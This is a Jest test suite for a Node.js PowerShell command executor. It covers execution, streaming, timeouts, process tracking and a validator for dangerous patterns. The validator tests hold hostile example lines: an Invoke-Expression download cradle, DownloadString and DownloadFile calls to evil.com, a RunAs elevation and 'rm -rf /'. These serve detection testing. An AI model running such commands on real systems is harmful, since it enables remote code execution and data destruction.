const PowerShellExecutor = require('../../server/src/utils/powershell-enhanced');
const { spawn } = require('child_process');
const EventEmitter = require('events');

// Mock child_process.spawn
jest.mock('child_process');

// Mock logger
jest.mock('../../server/src/utils/logger', () => ({
  info: jest.fn(),
  error: jest.fn(),
  warn: jest.fn()
}));

describe('PowerShell Enhanced - Complete Coverage', () => {
  let mockChild;
  let mockSpawn;

  beforeEach(() => {
    // Create a mock child process
    mockChild = new EventEmitter();
    mockChild.stdout = new EventEmitter();
    mockChild.stderr = new EventEmitter();
    mockChild.pid = 1234;
    mockChild.killed = false;
    mockChild.exitCode = null;
    mockChild.signalCode = null;
    mockChild.kill = jest.fn();

    mockSpawn = spawn;
    mockSpawn.mockReturnValue(mockChild);

    // Clear any existing active processes
    PowerShellExecutor.activeProcesses.clear();
    PowerShellExecutor.processCounter = 0;
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('PowerShell Command Execution', () => {
    test('should execute PowerShell command successfully', async () => {
      const command = 'Write-Host "Hello World"';
      const expectedOutput = 'Hello World';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Simulate stdout data
      mockChild.stdout.emit('data', Buffer.from(expectedOutput));
      
      // Simulate process completion
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(true);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe(expectedOutput);
      expect(result.stderr).toBe('');
      expect(result.command).toBe(command);
    });

    test('should handle stderr output', async () => {
      const command = 'Write-Error "Test error"';
      const expectedError = 'Test error';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Simulate stderr data
      mockChild.stderr.emit('data', Buffer.from(expectedError));
      
      // Simulate process completion with error
      setTimeout(() => {
        mockChild.emit('close', 1, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(false);
      expect(result.exitCode).toBe(1);
      expect(result.stdout).toBe('');
      expect(result.stderr).toBe(expectedError);
    });

    test('should handle streaming output', async () => {
      const command = 'Write-Host "Stream test"';
      const streamChunks = [];
      const onStream = jest.fn((chunk) => {
        streamChunks.push(chunk);
      });

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        streaming: true,
        onStream
      });

      // Simulate streaming data
      mockChild.stdout.emit('data', Buffer.from('Line 1\n'));
      mockChild.stdout.emit('data', Buffer.from('Line 2\n'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.streamingData).toHaveLength(2);
      expect(onStream).toHaveBeenCalledTimes(2);
      expect(result.streamingData[0].type).toBe('stdout');
      expect(result.streamingData[0].content).toBe('Line 1\n');
    });

    test('should handle streaming stderr', async () => {
      const command = 'Write-Error "Stream error"';
      const onStream = jest.fn();

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        streaming: true,
        onStream
      });

      // Simulate streaming stderr data
      mockChild.stderr.emit('data', Buffer.from('Error line\n'));
      
      setTimeout(() => {
        mockChild.emit('close', 1, null);
      }, 10);

      const result = await executePromise;

      expect(result.streamingData).toHaveLength(1);
      expect(onStream).toHaveBeenCalledTimes(1);
      expect(result.streamingData[0].type).toBe('stderr');
      expect(result.streamingData[0].content).toBe('Error line\n');
    });

    test('should handle working directory', async () => {
      const command = 'Get-Location';
      const workingDirectory = 'C:\\test';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        workingDirectory
      });

      mockChild.stdout.emit('data', Buffer.from('C:\\test'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.workingDirectory).toBe(workingDirectory);
      expect(mockSpawn).toHaveBeenCalledWith(
        'powershell.exe',
        expect.arrayContaining([
          expect.stringContaining(`Set-Location -Path '${workingDirectory}'`)
        ]),
        expect.any(Object)
      );
    });

    test('should handle process timeout', async () => {
      const command = 'Start-Sleep -Seconds 10';
      const timeout = 100;

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        timeout
      });

      // Don't emit close event to simulate hanging process
      await expect(executePromise).rejects.toThrow(`Command timed out after ${timeout}ms`);
      
      expect(mockChild.kill).toHaveBeenCalledWith('SIGTERM');
    });

    test('should handle process error', async () => {
      const command = 'Write-Host "Test"';
      const error = new Error('Process spawn failed');

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Simulate process error
      setTimeout(() => {
        mockChild.emit('error', error);
      }, 10);

      await expect(executePromise).rejects.toThrow('PowerShell process failed: Process spawn failed');
    });

    test('should truncate long commands in result', async () => {
      const longCommand = 'A'.repeat(150);

      const executePromise = PowerShellExecutor.executePowerShellCommand(longCommand);

      mockChild.stdout.emit('data', Buffer.from('output'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.command).toHaveLength(103); // 100 + '...'
      expect(result.command).toEndWith('...');
    });
  });

  describe('Batch File Execution', () => {
    test('should execute batch file successfully', async () => {
      const batchFilePath = 'C:\\test\\script.bat';
      const expectedOutput = 'Batch executed';

      const executePromise = PowerShellExecutor.executeBatchFile(batchFilePath);

      mockChild.stdout.emit('data', Buffer.from(expectedOutput));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(true);
      expect(result.stdout).toBe(expectedOutput);
      expect(mockSpawn).toHaveBeenCalledWith(
        'powershell.exe',
        expect.arrayContaining([
          expect.stringContaining(`& '.\\script.bat'`)
        ]),
        expect.any(Object)
      );
    });

    test('should use custom working directory for batch file', async () => {
      const batchFilePath = 'C:\\test\\script.bat';
      const workingDirectory = 'C:\\custom';

      const executePromise = PowerShellExecutor.executeBatchFile(batchFilePath, {
        workingDirectory
      });

      mockChild.stdout.emit('data', Buffer.from('output'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      await executePromise;

      expect(mockSpawn).toHaveBeenCalledWith(
        'powershell.exe',
        expect.arrayContaining([
          expect.stringContaining(`Set-Location -Path '${workingDirectory}'`)
        ]),
        expect.any(Object)
      );
    });
  });

  describe('Process Management', () => {
    test('should track active processes', async () => {
      const command = 'Write-Host "Test"';
      
      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Check active processes before completion
      const activeProcesses = PowerShellExecutor.getActiveProcesses();
      expect(activeProcesses.count).toBe(1);
      expect(activeProcesses.processes[0].processId).toBe(1);
      expect(activeProcesses.processes[0].pid).toBe(1234);

      // Complete the process
      mockChild.stdout.emit('data', Buffer.from('output'));
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      await executePromise;

      // Check active processes after completion
      const finalActiveProcesses = PowerShellExecutor.getActiveProcesses();
      expect(finalActiveProcesses.count).toBe(0);
    });

    test('should kill specific process', async () => {
      const command = 'Write-Host "Test"';
      
      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Kill the process
      const killed = PowerShellExecutor.killProcess(1);
      expect(killed).toBe(true);
      expect(mockChild.kill).toHaveBeenCalledWith('SIGTERM');

      // Try to kill non-existent process
      const killedNonExistent = PowerShellExecutor.killProcess(999);
      expect(killedNonExistent).toBe(false);
    });

    test('should kill all processes', async () => {
      const command1 = 'Write-Host "Test1"';
      const command2 = 'Write-Host "Test2"';
      
      // Start two processes
      PowerShellExecutor.executePowerShellCommand(command1);
      
      // Mock second child process
      const mockChild2 = new EventEmitter();
      mockChild2.stdout = new EventEmitter();
      mockChild2.stderr = new EventEmitter();
      mockChild2.kill = jest.fn();
      mockSpawn.mockReturnValueOnce(mockChild2);
      
      PowerShellExecutor.executePowerShellCommand(command2);

      // Kill all processes
      const killedCount = PowerShellExecutor.killAllProcesses();
      expect(killedCount).toBe(2);
      expect(mockChild.kill).toHaveBeenCalledWith('SIGTERM');
      expect(mockChild2.kill).toHaveBeenCalledWith('SIGTERM');

      // Check that all processes are cleared
      const activeProcesses = PowerShellExecutor.getActiveProcesses();
      expect(activeProcesses.count).toBe(0);
    });
  });

  describe('Command Validation and Sanitization', () => {
    test('should sanitize dangerous command patterns', () => {
      const dangerousCommand = 'Write-Host "Hello"; rm -rf /; $(evil-command) | dangerous & stuff';
      const sanitized = PowerShellExecutor.sanitizeCommand(dangerousCommand);
      
      expect(sanitized).toBe('Write-Host "Hello" rm -rf / dangerous  stuff');
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('&');
      expect(sanitized).not.toContain('|');
      expect(sanitized).not.toContain('`');
      expect(sanitized).not.toContain('$(');
    });

    test('should validate command for security threats', () => {
      const safeCommand = 'Write-Host "Hello World"';
      const validation = PowerShellExecutor.validateCommand(safeCommand);
      
      expect(validation.isValid).toBe(true);
      expect(validation.warnings).toHaveLength(0);
    });

    test('should detect Invoke-Expression pattern', () => {
      const dangerousCommand = 'Invoke-Expression "dangerous code"';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('Invoke-Expression');
    });

    test('should detect Invoke-Command pattern', () => {
      const dangerousCommand = 'Invoke-Command -ScriptBlock { evil }';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('Invoke-Command');
    });

    test('should detect WebClient download patterns', () => {
      const dangerousCommand = 'New-Object System.Net.WebClient';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('WebClient');
    });

    test('should detect DownloadString pattern', () => {
      const dangerousCommand = 'DownloadString("http://evil.com/script.ps1")';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('DownloadString');
    });

    test('should detect DownloadFile pattern', () => {
      const dangerousCommand = 'DownloadFile("http://evil.com/malware.exe", "C:\\temp\\malware.exe")';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('DownloadFile');
    });

    test('should detect RunAs elevation pattern', () => {
      const dangerousCommand = 'Start-Process -Verb RunAs -FilePath "evil.exe"';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings).toHaveLength(1);
      expect(validation.warnings[0]).toContain('RunAs');
    });

    test('should detect multiple dangerous patterns', () => {
      const dangerousCommand = 'Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://evil.com")';
      const validation = PowerShellExecutor.validateCommand(dangerousCommand);
      
      expect(validation.isValid).toBe(false);
      expect(validation.warnings.length).toBeGreaterThan(1);
    });
  });

  describe('UTF-8 Encoding Handling', () => {
    test('should handle UTF-8 characters in stdout', async () => {
      const command = 'Write-Host "テスト"';
      const utf8Output = 'テスト';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      mockChild.stdout.emit('data', Buffer.from(utf8Output, 'utf8'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.stdout).toBe(utf8Output);
    });

    test('should handle UTF-8 characters in stderr', async () => {
      const command = 'Write-Error "エラー"';
      const utf8Error = 'エラー';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      mockChild.stderr.emit('data', Buffer.from(utf8Error, 'utf8'));
      
      setTimeout(() => {
        mockChild.emit('close', 1, null);
      }, 10);

      const result = await executePromise;

      expect(result.stderr).toBe(utf8Error);
    });
  });

  describe('Process Timeout Handling', () => {
    test('should clear timeout on successful completion', async () => {
      const command = 'Write-Host "Quick task"';
      const timeout = 5000;

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        timeout
      });

      mockChild.stdout.emit('data', Buffer.from('Quick task'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(true);
      expect(mockChild.kill).not.toHaveBeenCalled();
    });

    test('should handle process killed by timeout', async () => {
      const command = 'Start-Sleep -Seconds 10';
      const timeout = 50;

      const executePromise = PowerShellExecutor.executePowerShellCommand(command, {
        timeout
      });

      await expect(executePromise).rejects.toThrow(`Command timed out after ${timeout}ms`);
      expect(mockChild.kill).toHaveBeenCalledWith('SIGTERM');
    });
  });

  describe('Process Signal Handling', () => {
    test('should handle process killed by signal', async () => {
      const command = 'Write-Host "Test"';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      // Simulate process killed by signal
      setTimeout(() => {
        mockChild.emit('close', null, 'SIGTERM');
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(false);
      expect(result.exitCode).toBe(null);
      expect(result.signal).toBe('SIGTERM');
    });
  });

  describe('Edge Cases and Error Handling', () => {
    test('should handle empty command', async () => {
      const command = '';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      mockChild.stdout.emit('data', Buffer.from(''));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(true);
      expect(result.stdout).toBe('');
    });

    test('should handle command with only whitespace', async () => {
      const command = '   \n\t   ';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      mockChild.stdout.emit('data', Buffer.from(''));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.success).toBe(true);
      expect(result.stdout).toBe('');
    });

    test('should include timestamp in result', async () => {
      const command = 'Write-Host "Test"';

      const executePromise = PowerShellExecutor.executePowerShellCommand(command);

      mockChild.stdout.emit('data', Buffer.from('Test'));
      
      setTimeout(() => {
        mockChild.emit('close', 0, null);
      }, 10);

      const result = await executePromise;

      expect(result.timestamp).toBeDefined();
      expect(typeof result.timestamp).toBe('string');
      expect(new Date(result.timestamp).toISOString()).toBe(result.timestamp);
    });
  });
});